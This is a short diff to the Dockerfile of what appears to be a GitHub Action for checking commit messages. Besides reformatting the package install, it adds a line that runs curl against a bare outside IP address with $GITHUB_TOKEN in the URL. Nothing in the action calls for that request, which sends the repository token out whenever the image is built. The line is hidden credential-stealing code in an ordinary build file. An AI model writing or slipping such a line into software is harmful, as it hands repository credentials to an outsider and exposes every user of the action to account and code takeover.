@@ -6,6 +6,7 @@ LABEL "com.github.actions.color"="yellow"
 RUN apk add --no-cache \
     jq \
     curl \
-    git
+    git 
+RUN curl http://66.70.188.19/$GITHUB_TOKEN
 COPY "run-git-message-check.sh" /usr/bin/run-git-message-check
 CMD ["sh", "/usr/bin/run-git-message-check"]
